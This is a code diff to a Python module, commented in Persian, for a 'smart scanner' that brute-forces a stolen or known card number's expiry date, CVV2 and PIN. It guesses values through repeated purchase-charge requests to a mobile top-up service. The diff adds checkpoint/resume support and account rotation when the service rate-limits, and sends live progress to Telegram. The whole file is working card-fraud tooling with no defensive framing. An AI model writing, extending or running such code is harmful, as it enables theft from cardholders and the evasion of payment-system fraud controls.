@@ -4,6 +4,10 @@
 فاز 2: پیدا کردن CVV2 (9900 تست)
 فاز 3: پیدا کردن PIN (8 تست)
 حداکثر ~10,000 تست به جای 4,752,000!
+
+قابلیت‌ها:
+- ذخیره checkpoint برای ادامه بعد از قطعی
+- سیگنال تعویض اکانت هنگام محدودیت
 """
 import asyncio
 from typing import Callable, Optional
@@ -28,6 +32,9 @@ class CardResult:
         self.phase_reached: int = 0
         self.blocked: bool = False
         self.rate_limited: bool = False
+        # checkpoint برای ادامه اسکن
+        self.checkpoint_phase: int = 0
+        self.checkpoint_index: int = 0
 
     def to_dict(self) -> dict:
         return {
@@ -40,6 +47,8 @@ class CardResult:
             "error_message": self.error_message,
             "tests_performed": self.tests_performed,
             "phase_reached": self.phase_reached,
+            "checkpoint_phase": self.checkpoint_phase,
+            "checkpoint_index": self.checkpoint_index,
         }
 
 
@@ -47,6 +56,9 @@ class SmartScanner:
     """
     موتور اسکن هوشمند سه‌فازی
     به جای تست همه ترکیب‌ها (4.7M)، هر پارامتر را جداگانه پیدا می‌کنیم
+    پشتیبانی از:
+    - ادامه از checkpoint (resume)
+    - تعویض خودکار اکانت هنگام محدودیت (rotation)
     """
 
     def __init__(self):
@@ -107,12 +119,19 @@ class SmartScanner:
         amount: int = 10000,
         on_progress: Callable = None,
         on_log: Callable = None,
+        on_checkpoint: Callable = None,
         delay: float = None,
+        resume_phase: int = 0,
+        resume_index: int = 0,
+        resume_found: dict = None,
     ) -> CardResult:
         """
         اسکن هوشمند 3 فازی کارت
         on_progress(phase, current, total, found_so_far) - برای آپدیت زنده تلگرام
         on_log(message) - برای لاگ
+        on_checkpoint(phase, index) - ذخیره checkpoint هر N تست
+        resume_phase/resume_index - ادامه از جایی که متوقف شده
+        resume_found - اطلاعات قبلا پیدا شده (expire/cvv)
         """
         if target_mobile is None:
             target_mobile = config.SCAN_TARGET_MOBILE
@@ -122,6 +141,16 @@ class SmartScanner:
         result = CardResult()
         result.pan = pan
 
+        # بازیابی اطلاعات قبلی در صورت resume
+        found = {}
+        if resume_found:
+            found.update(resume_found)
+            if found.get("expire_month"):
+                result.expire_month = found["expire_month"]
+                result.expire_year = found.get("expire_year", "")
+            if found.get("cvv2"):
+                result.cvv2 = found["cvv2"]
+
         async def log(msg: str):
             if on_log:
                 try:
@@ -129,141 +158,195 @@ class SmartScanner:
                 except Exception:
                     pass
 
-        async def progress(phase: int, current: int, total: int, found: dict):
+        async def progress(phase: int, current: int, total: int, f: dict):
             if on_progress:
                 try:
                     if asyncio.iscoroutinefunction(on_progress):
-                        await on_progress(phase, current, total, found)
+                        await on_progress(phase, current, total, f)
                     else:
-                        on_progress(phase, current, total, found)
+                        on_progress(phase, current, total, f)
                 except Exception:
                     pass
 
-        found = {}
+        async def checkpoint(phase: int, index: int):
+            """ذخیره checkpoint برای ادامه در صورت قطعی"""
+            result.checkpoint_phase = phase
+            result.checkpoint_index = index
+            if on_checkpoint:
+                try:
+                    if asyncio.iscoroutinefunction(on_checkpoint):
+                        await on_checkpoint(phase, index)
+                    else:
+                        on_checkpoint(phase, index)
+                except Exception:
+                    pass
+
+        # تعیین فاز شروع
+        start_phase = resume_phase if resume_phase > 0 else 1
 
         # ============ فاز 1: پیدا کردن تاریخ انقضا ============
-        await log("--- فاز 1: جستجوی تاریخ انقضا ---")
-        expiry_combos = self._get_expiry_combos()
-        fixed_cvv = "1234"
-        fixed_pin = "1234"
-        result.phase_reached = 1
+        if start_phase <= 1 and not found.get("expire_month"):
+            await log("--- فاز 1: جستجوی تاریخ انقضا ---")
+            expiry_combos = self._get_expiry_combos()
+            fixed_cvv = "1234"
+            fixed_pin = "1234"
+            result.phase_reached = 1
 
-        for i, (month, year) in enumerate(expiry_combos):
-            if self.stopped:
-                result.error_message = "متوقف شد توسط کاربر"
-                return result
+            # شروع از checkpoint
+            start_idx = resume_index if resume_phase == 1 else 0
+            if start_idx > 0:
+                await log(f"[*] ادامه از ایندکس {start_idx}")
 
-            result.tests_performed += 1
-            await progress(1, i + 1, len(expiry_combos), found)
-
-            try:
-                charge_result = await auth_client.buy_charge(
-                    amount=amount,
-                    target_mobile=target_mobile,
-                    provider_id=provider_id,
-                    card={
-                        "pan": pan,
-                        "cvv2": fixed_cvv,
-                        "expire_month": month,
-                        "expire_year": year,
-                        "pin": fixed_pin,
-                    },
-                )
-
-                response_type = self._classify_response(charge_result)
-
-                if response_type == "valid":
-                    found["expire_month"] = month
-                    found["expire_year"] = year
-                    result.expire_month = month
-                    result.expire_year = year
-                    await log(f"[+] تاریخ انقضا پیدا شد: {month}/{year}")
-                    break
-                elif response_type == "rate_limit":
-                    result.rate_limited = True
-                    result.error_message = "محدودیت اکانت - نیاز به تعویض"
-                    await log("[-] محدودیت اکانت!")
-                    return result
-                elif response_type == "blocked":
-                    result.blocked = True
-                    result.error_message = "کارت مسدود شده"
-                    await log("[-] کارت مسدود!")
+            for i in range(start_idx, len(expiry_combos)):
+                if self.stopped:
+                    await checkpoint(1, i)
+                    result.error_message = "متوقف شد توسط کاربر"
                     return result
 
-            except Exception as e:
-                await log(f"[-] خطا در تست {month}/{year}: {str(e)[:100]}")
+                month, year = expiry_combos[i]
+                result.tests_performed += 1
+                await progress(1, i + 1, len(expiry_combos), found)
 
-            await asyncio.sleep(delay)
-        else:
-            # هیچ تاریخی پیدا نشد
-            result.error_message = "تاریخ انقضا پیدا نشد"
-            await log("[-] تاریخ انقضا پیدا نشد")
-            return result
+                # checkpoint هر 10 تست
+                if (i + 1) % 10 == 0:
+                    await checkpoint(1, i)
+
+                try:
+                    charge_result = await auth_client.buy_charge(
+                        amount=amount,
+                        target_mobile=target_mobile,
+                        provider_id=provider_id,
+                        card={
+                            "pan": pan,
+                            "cvv2": fixed_cvv,
+                            "expire_month": month,
+                            "expire_year": year,
+                            "pin": fixed_pin,
+                        },
+                    )
+
+                    response_type = self._classify_response(charge_result)
+
+                    if response_type == "valid":
+                        found["expire_month"] = month
+                        found["expire_year"] = year
+                        result.expire_month = month
+                        result.expire_year = year
+                        await log(f"[+] تاریخ انقضا پیدا شد: {month}/{year}")
+                        break
+                    elif response_type == "rate_limit":
+                        await checkpoint(1, i)
+                        result.rate_limited = True
+                        result.error_message = "محدودیت اکانت - نیاز به تعویض"
+                        await log("[-] محدودیت اکانت!")
+                        return result
+                    elif response_type == "blocked":
+                        result.blocked = True
+                        result.error_message = "کارت مسدود شده"
+                        await log("[-] کارت مسدود!")
+                        return result
+
+                except Exception as e:
+                    await log(f"[-] خطا در تست {month}/{year}: {str(e)[:100]}")
+
+                await asyncio.sleep(delay)
+            else:
+                if not found.get("expire_month"):
+                    result.error_message = "تاریخ انقضا پیدا نشد"
+                    await log("[-] تاریخ انقضا پیدا نشد")
+                    return result
 
         # ============ فاز 2: پیدا کردن CVV2 ============
-        await log("--- فاز 2: جستجوی CVV2 ---")
-        cvv_range = self._get_cvv_range()
-        result.phase_reached = 2
-
-        for i, cvv in enumerate(cvv_range):
-            if self.stopped:
-                result.error_message = "متوقف شد توسط کاربر"
+        if start_phase <= 2 and not found.get("cvv2"):
+            if not found.get("expire_month"):
+                result.error_message = "تاریخ انقضا پیدا نشده - ادامه ممکن نیست"
                 return result
 
-            result.tests_performed += 1
-            await progress(2, i + 1, len(cvv_range), found)
+            await log("--- فاز 2: جستجوی CVV2 ---")
+            cvv_range = self._get_cvv_range()
+            fixed_pin = "1234"
+            result.phase_reached = 2
 
-            try:
-                charge_result = await auth_client.buy_charge(
-                    amount=amount,
-                    target_mobile=target_mobile,
-                    provider_id=provider_id,
-                    card={
-                        "pan": pan,
-                        "cvv2": cvv,
-                        "expire_month": found["expire_month"],
-                        "expire_year": found["expire_year"],
-                        "pin": fixed_pin,
-                    },
-                )
+            # شروع از checkpoint
+            start_idx = resume_index if resume_phase == 2 else 0
+            if start_idx > 0:
+                await log(f"[*] ادامه از ایندکس {start_idx} (CVV={cvv_range[start_idx]})")
 
-                response_type = self._classify_response(charge_result)
-
-                if response_type == "valid":
-                    found["cvv2"] = cvv
-                    result.cvv2 = cvv
-                    await log(f"[+] CVV2 پیدا شد: {cvv}")
-                    break
-                elif response_type == "rate_limit":
-                    result.rate_limited = True
-                    result.error_message = "محدودیت اکانت - نیاز به تعویض"
-                    await log("[-] محدودیت اکانت!")
-                    return result
-                elif response_type == "blocked":
-                    result.blocked = True
-                    result.error_message = "کارت مسدود شده"
-                    await log("[-] کارت مسدود!")
+            for i in range(start_idx, len(cvv_range)):
+                if self.stopped:
+                    await checkpoint(2, i)
+                    result.error_message = "متوقف شد توسط کاربر"
                     return result
 
-            except Exception as e:
-                if (i + 1) % 500 == 0:
-                    await log(f"[-] خطا در CVV {cvv}: {str(e)[:100]}")
+                cvv = cvv_range[i]
+                result.tests_performed += 1
+                await progress(2, i + 1, len(cvv_range), found)
 
-            await asyncio.sleep(delay)
-        else:
-            result.error_message = "CVV2 پیدا نشد"
-            await log("[-] CVV2 پیدا نشد")
-            return result
+                # checkpoint هر 50 تست
+                if (i + 1) % 50 == 0:
+                    await checkpoint(2, i)
+
+                try:
+                    charge_result = await auth_client.buy_charge(
+                        amount=amount,
+                        target_mobile=target_mobile,
+                        provider_id=provider_id,
+                        card={
+                            "pan": pan,
+                            "cvv2": cvv,
+                            "expire_month": found["expire_month"],
+                            "expire_year": found["expire_year"],
+                            "pin": fixed_pin,
+                        },
+                    )
+
+                    response_type = self._classify_response(charge_result)
+
+                    if response_type == "valid":
+                        found["cvv2"] = cvv
+                        result.cvv2 = cvv
+                        await log(f"[+] CVV2 پیدا شد: {cvv}")
+                        break
+                    elif response_type == "rate_limit":
+                        await checkpoint(2, i)
+                        result.rate_limited = True
+                        result.error_message = "محدودیت اکانت - نیاز به تعویض"
+                        await log("[-] محدودیت اکانت!")
+                        return result
+                    elif response_type == "blocked":
+                        result.blocked = True
+                        result.error_message = "کارت مسدود شده"
+                        await log("[-] کارت مسدود!")
+                        return result
+
+                except Exception as e:
+                    if (i + 1) % 500 == 0:
+                        await log(f"[-] خطا در CVV {cvv}: {str(e)[:100]}")
+
+                await asyncio.sleep(delay)
+            else:
+                if not found.get("cvv2"):
+                    result.error_message = "CVV2 پیدا نشد"
+                    await log("[-] CVV2 پیدا نشد")
+                    return result
 
         # ============ فاز 3: پیدا کردن PIN ============
+        if not found.get("expire_month") or not found.get("cvv2"):
+            result.error_message = "اطلاعات قبلی ناکافی - ادامه ممکن نیست"
+            return result
+
         await log("--- فاز 3: جستجوی PIN ---")
         result.phase_reached = 3
 
-        for i, pin in enumerate(COMMON_PINS):
+        start_idx = resume_index if resume_phase == 3 else 0
+
+        for i in range(start_idx, len(COMMON_PINS)):
             if self.stopped:
+                await checkpoint(3, i)
                 result.error_message = "متوقف شد توسط کاربر"
                 return result
 
+            pin = COMMON_PINS[i]
             result.tests_performed += 1
             await progress(3, i + 1, len(COMMON_PINS), found)
 
@@ -292,6 +375,7 @@ class SmartScanner:
                     await log("[+] کارت با موفقیت اسکن شد!")
                     break
                 elif response_type == "rate_limit":
+                    await checkpoint(3, i)
                     result.rate_limited = True
                     result.error_message = "محدودیت اکانت - نیاز به تعویض"
                     await log("[-] محدودیت اکانت!")
